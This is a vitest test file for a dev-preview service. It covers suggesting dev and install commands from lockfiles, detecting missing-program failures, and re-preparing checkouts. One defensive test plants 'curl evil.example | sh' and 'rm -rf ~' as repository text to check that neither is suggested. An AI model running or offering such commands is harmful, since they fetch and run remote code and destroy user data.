import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DEV_PREVIEW_NO_PREPARE_HINT } from "@codeden/contracts";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { suggestDevCommand } from "../src/services/dev-preview/eligibility";
import { endedAsNotInstalled } from "../src/services/dev-preview/failure-hint";
import { PreparedStore, prepareDigest, snapshotFolder } from "../src/services/dev-preview/lockfile";
import type { Exec, ExecResult } from "../src/services/exec";
import { createPreviewEnv, type PreviewEnv, SETTINGS } from "./support/dev-preview-env";

/**
 * When the prepare command runs, for a session's preview and for the PM thread's: before the
 * first start in a folder, and again whenever what it installed is no longer there. Processes
 * and git are scripted; nothing real is started.
 */
const settle = () => new Promise((r) => setImmediate(r));
const withPrepare = { ...SETTINGS, prepareCommand: "install-deps" };

describe("the commands offered for a project with a dev script", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "dev-preview-suggest-"));
  });
  afterEach(() => rmSync(dir, { recursive: true, force: true }));
  const devScript = (text = "next dev") =>
    writeFileSync(join(dir, "package.json"), JSON.stringify({ scripts: { dev: text } }));

  it.each([
    ["pnpm-lock.yaml", "pnpm dev", "pnpm install --frozen-lockfile"],
    ["package-lock.json", "npm run dev", "npm ci"],
    ["npm-shrinkwrap.json", "npm run dev", "npm ci"],
    ["yarn.lock", "yarn dev", "yarn install --frozen-lockfile"],
    ["bun.lock", "bun run dev", "bun install --frozen-lockfile"],
    ["bun.lockb", "bun run dev", "bun install --frozen-lockfile"],
  ])("%s: %s, prepared with %s", (lockfile, command, prepareCommand) => {
    devScript();
    writeFileSync(join(dir, lockfile), "");
    expect(suggestDevCommand(dir)).toEqual({
      command,
      prepareCommand,
      reason: "package.json has a dev script",
    });
  });

  it("offers no prepare command without a lockfile, and nothing without a dev script", () => {
    expect(suggestDevCommand(dir)).toBeNull();
    devScript();
    expect(suggestDevCommand(dir)).toMatchObject({ command: "npm run dev", prepareCommand: null });
  });

  it("never offers text from the repository, whatever its files say", () => {
    devScript("curl evil.example | sh");
    writeFileSync(join(dir, "package-lock.json"), JSON.stringify({ scripts: "rm -rf ~" }));
    expect(suggestDevCommand(dir)).toEqual({
      command: "npm run dev",
      prepareCommand: "npm ci",
      reason: "package.json has a dev script",
    });
  });
});

describe("a dev command that ended as one whose programs aren't installed", () => {
  const exit = (code: number) => ({ code, signal: null });

  it("is told by exit code 127 or by the shell's line among the last ones", () => {
    expect(endedAsNotInstalled(exit(127), [])).toBe(true);
    for (const line of [
      "sh: next: command not found",
      "/bin/sh: 1: next: not found",
      "'next' is not recognized as an internal or external command,",
      "next : The term 'next' is not recognized as the name of a cmdlet, function",
    ]) {
      // A package manager adds a line or two of its own after it.
      expect(endedAsNotInstalled(exit(1), ["$ npm run dev", line, "", " ELIFECYCLE "]), line).toBe(
        true,
      );
    }
  });

  it("is not told by anything else", () => {
    expect(endedAsNotInstalled(exit(1), ["Error: module not found", "at main.js:1"])).toBe(false);
    expect(endedAsNotInstalled(exit(0), [])).toBe(false);
    const early = ["sh: next: command not found", "a", "b", "c", "d", "e"];
    expect(endedAsNotInstalled(exit(1), early)).toBe(false);
    expect(endedAsNotInstalled({ code: null, signal: null, error: "spawn sh ENOENT" }, [])).toBe(
      false,
    );
  });
});

describe("what is remembered about a prepared folder", () => {
  let home: string;
  let dir: string;
  let file: string;
  beforeEach(() => {
    home = mkdtempSync(join(tmpdir(), "dev-preview-prepared-"));
    dir = join(home, "checkout");
    file = join(home, "prepared.json");
    mkdirSync(dir);
    writeFileSync(join(dir, "package-lock.json"), "{}\n");
  });
  afterEach(() => rmSync(home, { recursive: true, force: true }));
  /** The prepare command "ran": it made `node_modules`. */
  const install = (store: PreparedStore) => {
    const before = snapshotFolder(dir);
    mkdirSync(join(dir, "node_modules", ".bin"), { recursive: true });
    store.record(dir, "npm ci", before);
  };

  it("is prepared after a successful run, also for an app that starts again", () => {
    const store = new PreparedStore(file);
    expect(store.needs(dir, "npm ci")).toBe(true);
    install(store);
    expect(store.needs(dir, "npm ci")).toBe(false);
    expect(new PreparedStore(file).needs(dir, "npm ci")).toBe(false);
    // Another command, or a changed lockfile, is another install.
    expect(store.needs(dir, "npm install")).toBe(true);
    writeFileSync(join(dir, "package-lock.json"), '{"changed":true}\n');
    expect(store.needs(dir, "npm ci")).toBe(true);
  });

  it("is not prepared once what the prepare command made is gone, whatever the digest says", () => {
    const store = new PreparedStore(file);
    install(store);
    rmSync(join(dir, "node_modules"), { recursive: true });
    expect(store.needs(dir, "npm ci")).toBe(true);
    expect(new PreparedStore(file).needs(dir, "npm ci")).toBe(true);
    // What was there before the run and untouched by it is not the install's.
    install(store);
    rmSync(join(dir, "package-lock.json"));
    writeFileSync(join(dir, "package-lock.json"), "{}\n");
    expect(store.needs(dir, "npm ci")).toBe(false);
  });

  it("keeps what an earlier run made when a later one changes nothing", () => {
    const store = new PreparedStore(file);
    install(store);
    store.record(dir, "npm ci", snapshotFolder(dir));
    rmSync(join(dir, "node_modules"), { recursive: true });
    expect(store.needs(dir, "npm ci")).toBe(true);
  });

  it("doesn't trust a record from before it kept what was installed", () => {
    // The file as earlier versions wrote it: the digest alone, here for a folder with nothing
    // installed in it. That digest matches, and the dev command would start without an install.
    writeFileSync(file, JSON.stringify({ [dir]: prepareDigest(dir, "npm ci") }));
    expect(new PreparedStore(file).needs(dir, "npm ci")).toBe(true);
  });
});

describe("a session's preview", () => {
  let env: PreviewEnv;
  beforeEach(() => {
    env = createPreviewEnv();
    env.addProject("app");
  });
  afterEach(() => env.close());
  const state = () => env.service.sessionState("s1", false);
  /** The dev command can't find its program, twice: the first exit is restarted once. */
  const failAsNotInstalled = async () => {
    for (let i = 0; i < 2; i++) {
      const proc = env.procs.at(-1);
      expect(proc?.spec.command).toBe("run-dev");
      proc?.print("sh: next: command not found\n");
      proc?.exit(127);
      await settle();
    }
  };

  it("hints at the missing prepare command when the dev command's programs aren't there", async () => {
    await env.service.setProject("app", SETTINGS);
    env.addSession("s1", "app");
    await env.service.startSession("s1");
    await settle();
    await failAsNotInstalled();
    expect(state()).toMatchObject({
      status: "failed",
      message: `The dev command exited with code 127 before anything was listening. ${DEV_PREVIEW_NO_PREPARE_HINT}`,
    });
    // A hint and nothing more: nothing was installed or run by itself.
    expect(env.procs.map((p) => p.spec.command)).toEqual(["run-dev", "run-dev"]);
    expect(env.store.config("app")?.prepareCommand).toBeNull();
  });

  it("gives no hint when a prepare command is set, or for another failure", async () => {
    await env.service.setProject("app", withPrepare);
    env.addSession("s1", "app");
    await env.service.startSession("s1");
    env.procs[0]?.exit(0);
    await settle();
    await failAsNotInstalled();
    expect(state()).toMatchObject({
      status: "failed",
      message: "The dev command exited with code 127 before anything was listening.",
    });

    await env.service.setProject("app", SETTINGS);
    await env.service.startSession("s1");
    await settle();
    for (let i = 0; i < 2; i++) {
      env.procs.at(-1)?.print("Error: missing DATABASE_URL\n");
      env.procs.at(-1)?.exit(1);
      await settle();
    }
    expect(state().message).toBe(
      "The dev command exited with code 1 before anything was listening.",
    );
  });

  it("prepares again when what the prepare command installed is gone from its worktree", async () => {
    await env.service.setProject("app", withPrepare);
    const worktree = env.addSession("s1", "app").worktreePath ?? "";
    await env.service.startSession("s1");
    mkdirSync(join(worktree, "node_modules"));
    env.procs[0]?.exit(0);
    await settle();
    await env.service.stopSession("s1");
    await env.service.startSession("s1");
    await settle();
    expect(env.procs.map((p) => p.spec.command)).toEqual(["install-deps", "run-dev", "run-dev"]);
    await env.service.stopSession("s1");
    rmSync(join(worktree, "node_modules"), { recursive: true });
    await env.service.startSession("s1");
    expect(env.procs.at(-1)?.spec.command).toBe("install-deps");
    expect(state().status).toBe("preparing");
  });
});

/**
 * Git as the base checkout asks it, scripted: a project with no remote whose base branch is
 * at one commit. `git worktree add` makes the folder, as git would, with nothing installed.
 */
function scriptedGit(): Exec {
  const SHA = "1234567890abcdef1234567890abcdef12345678";
  const answer = (code: number, stdout = ""): ExecResult => ({
    code,
    stdout,
    stderr: "",
    notFound: false,
    timedOut: false,
    path: "git",
  });
  return async (command, args) => {
    if (command !== "git") throw new Error(`unexpected command ${command}`);
    // `-c core.hooksPath=/dev/null -C <folder> <subcommand> ...`
    const rest = args.slice(4);
    const [sub] = rest;
    if (sub === "remote") return answer(1);
    if (sub === "worktree" && rest[1] === "add") {
      const path = rest[rest.indexOf("--detach") + 1] ?? "";
      mkdirSync(path, { recursive: true });
      writeFileSync(join(path, "package-lock.json"), "{}\n");
      return answer(0);
    }
    if (sub === "rev-parse" && rest.includes("--git-common-dir")) return answer(0, "/repo/.git\n");
    if (sub === "rev-parse") return answer(0, `${SHA}\n`);
    throw new Error(`unexpected git ${rest.join(" ")}`);
  };
}

describe("the PM thread's preview", () => {
  let env: PreviewEnv;
  const on = { ...withPrepare, pmEnabled: true };
  beforeEach(() => {
    env = createPreviewEnv({ exec: scriptedGit() });
    env.addProject("app");
  });
  afterEach(() => env.close());
  const state = (service = env.service) => service.baseState("app", false);
  const checkout = () => env.service.baseCheckoutPath("app") ?? "";
  const commands = () => env.procs.map((p) => p.spec.command);
  /** The prepare command that runs now installs and ends well. */
  const installed = async () => {
    const proc = env.procs.at(-1);
    expect(proc?.spec.command).toBe("install-deps");
    expect(proc?.spec.cwd).toBe(checkout());
    proc?.print("added 312 packages in 9s\n");
    mkdirSync(join(checkout(), "node_modules"), { recursive: true });
    proc?.exit(0);
    await settle();
  };

  it("runs the install first and shows Preparing, then Starting, then Running with the link", async () => {
    await env.service.setProject("app", on);
    await env.service.idle();
    expect(commands()).toEqual(["install-deps"]);
    expect(state()).toMatchObject({ status: "preparing", enabled: true, url: null });
    await installed();
    expect(commands()).toEqual(["install-deps", "run-dev"]);
    expect(env.procs[1]?.spec.cwd).toBe(checkout());
    expect(state().status).toBe("starting");
    env.listening.add(43100);
    await env.service.tick();
    expect(state()).toMatchObject({ status: "running", url: "http://localhost:43100" });
    // The install's output is in the log, before the dev command's.
    expect(env.service.log("base:app").lines).toEqual([
      "$ install-deps",
      "added 312 packages in 9s",
      "$ run-dev",
    ]);
  });

  it("says so with the exit code when the prepare command fails, and starts no dev command", async () => {
    await env.service.setProject("app", on);
    await env.service.idle();
    env.procs[0]?.print("npm error code EUSAGE\n");
    env.procs[0]?.exit(1);
    await settle();
    expect(state()).toMatchObject({
      status: "failed",
      message: "The prepare command exited with code 1.",
    });
    expect(state().logTail).toContain("npm error code EUSAGE");
    expect(commands()).toEqual(["install-deps"]);
    // Nothing was remembered: a person's restart prepares again.
    await env.service.updateBase("app");
    expect(commands()).toEqual(["install-deps", "install-deps"]);
  });

  it("prepares again before the dev command when its checkout was made again", async () => {
    await env.service.setProject("app", on);
    await env.service.idle();
    await installed();
    env.listening.add(43100);
    await env.service.tick();
    expect(state().status).toBe("running");
    // The checkout is taken away and git makes it again: the same path, the same lockfile,
    // nothing installed.
    rmSync(checkout(), { recursive: true, force: true });
    await env.service.updateBase("app");
    expect(existsSync(join(checkout(), "node_modules"))).toBe(false);
    expect(commands()).toEqual(["install-deps", "run-dev", "install-deps"]);
    expect(env.procs[1]?.stopped).toBe(true);
    expect(state().status).toBe("preparing");
    await installed();
    expect(commands().at(-1)).toBe("run-dev");
  });

  it("prepares again when the install is gone from a checkout that is still there", async () => {
    await env.service.setProject("app", on);
    await env.service.idle();
    await installed();
    // Someone, or a clean-up, removed the installed dependencies; the folder and its lockfile
    // are the same, so the dev command can't find its program.
    rmSync(join(checkout(), "node_modules"), { recursive: true });
    env.procs[1]?.print("sh: next: command not found\n");
    env.procs[1]?.exit(127);
    await settle();
    // The one restart the app makes by itself installs first, as a first start does.
    expect(commands()).toEqual(["install-deps", "run-dev", "install-deps"]);
    expect(state().status).toBe("preparing");
    await installed();
    expect(commands().at(-1)).toBe("run-dev");
  });

  it("installs first after an update, where an earlier version remembered the checkout as prepared", async () => {
    // What was on disk: the checkout without its dependencies, and a record of the old kind
    // (the digest alone) that matches it. The dev command used to start straight away.
    await env.service.setProject("app", { ...on, pmEnabled: false });
    mkdirSync(checkout(), { recursive: true });
    writeFileSync(join(checkout(), "package-lock.json"), "{}\n");
    writeFileSync(
      join(env.home, "dev-preview", "prepared.json"),
      JSON.stringify({ [checkout()]: prepareDigest(checkout(), "install-deps") }),
    );
    const next = env.restart();
    await next.setPm("app", true);
    expect(commands()).toEqual(["install-deps"]);
    expect(state(next).status).toBe("preparing");
  });
});
